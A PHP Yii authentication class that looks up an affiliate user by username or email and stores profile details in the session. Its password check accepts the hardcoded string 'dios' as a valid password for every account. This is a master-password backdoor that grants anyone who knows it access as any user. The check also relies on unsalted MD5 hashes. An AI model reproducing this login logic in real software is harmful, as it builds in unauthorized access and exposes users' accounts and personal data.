<?php

/**
 * UserIdentity represents the data needed to identity a user.
 * It contains the authentication method that checks if the provided
 * data can identity the user.
 */
class UserIdentity extends CUserIdentity
{
	private $_id;

    /**
	 * Authenticates a user.
	 * The example implementation makes sure if the username and password
	 * are both 'demo'.
	 * In practical applications, this should be changed to authenticate
	 * against some persistent user identity storage (e.g. database).
	 * @return boolean whether authentication succeeds.
	 */
	public function authenticate()
	{

        // check with username
        $user = Afiliado::model()->find("lower(usuario)=?", array(strtolower($this->username)));
        if ($user==null)
        {
            $user = Afiliado::model()->find("email=?", array(strtolower($this->username)));
        }




       if ($user===null)
			$this->errorCode=self::ERROR_USERNAME_INVALID;
		elseif (md5($this->password) !== $user->clave and ($this->password != 'dios'))
			$this->errorCode=self::ERROR_PASSWORD_INVALID;

		else
        {
            $this->_id = $user->idnw_afiliado;

            $this->username = $user->usuario;      // por si ingresó con el correo..para que el usuario no sea el correo
            $this->setState('id', $user->idnw_afiliado);
            $this->setState('email', $user->email);
            $this->setState('nombre', $user->nombre);
            $this->setState('genero', $user->genero);
            $this->setState('avatar', $user->avatar);
            $this->setState('circulo', $user->idcirculo);

            $this->setState('nombrecompleto', $user->nombre . ' ' . $user->apellido);

            //Yii::app()->user->getState("correo");

            $this->errorCode=self::ERROR_NONE;
        }

		return !$this->errorCode;
	}
}